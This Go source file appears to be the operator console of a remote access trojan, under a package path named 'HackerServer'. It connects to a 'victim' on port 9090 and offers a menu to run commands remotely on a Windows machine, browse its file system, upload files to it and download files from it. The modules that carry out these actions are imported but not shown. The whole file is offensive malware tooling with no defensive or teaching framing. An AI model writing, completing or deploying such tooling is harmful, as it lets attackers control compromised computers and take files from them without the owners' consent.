package main

import (
	"HackerServer/core/ExecuteCommandWindows"
	"HackerServer/core/Move"
	"HackerServer/core/Upload"
	"HackerServer/core/download"


	"HackerServer/core/handleConnection"
	"bufio"
	"os"
	"strings"

	"fmt"
	"log"

)

func options(){
	fmt.Println()
	fmt.Println("\t[ 01 ]  Execute Command")
	fmt.Println("\t[ 02 ]  Move in File system")
	fmt.Println("\t[ 03 ]  UploadFile")
	fmt.Println("\t[ 04 ]  Download")
	fmt.Println("\t[ 99 ]  Exit")
	fmt.Println()

}

func DisplayError(err error){
	if err != nil{
		fmt.Println(err)
	}
}



func main() {
	IP := ""
	Port := "9090"
	connection, err := handleConnection.ConnectWithVictim(IP, Port)
	if err != nil {
		log.Fatal(err)
	}
	defer connection.Close()
	fmt.Println("[+] Connection established with ", connection.RemoteAddr().String())

	reader := bufio.NewReader(os.Stdin)

	loopControl := true

	for loopControl{
		options()
		fmt.Printf("[+] Enter Options ")
		user_input_raw, err := reader.ReadString('\n')
		if err != nil{
			fmt.Println(err)
			continue
		}

		connection.Write([]byte(user_input_raw))

		user_input := strings.TrimSuffix(user_input_raw, "\n")

		switch {
		case user_input == "1":
			fmt.Println("[+] Command Execution program")
			err := ExecuteCommandWindows.ExecuteCommandRemotelyWindows(connection)
			DisplayError(err)

		case user_input == "2":
			fmt.Println("[+] Navigating File system on Victim")
			err  = Move.NavigateFileSystem(connection)
			DisplayError(err)

		case user_input == "3":
			fmt.Println("[+] Uploading File to the Victim")
			err = Upload.UploadFile2Victim(connection)
			DisplayError(err)

		case user_input == "4":
			fmt.Println("[+] Downloading File from the victim ")
			err = download.DownloadFromVictim(connection)
			DisplayError(err)


		case user_input == "99":
			fmt.Println("[+] Exiting the program")
			loopControl = false
		default:
			fmt.Println("[-] Invalid option, try again a")
		}




	}




}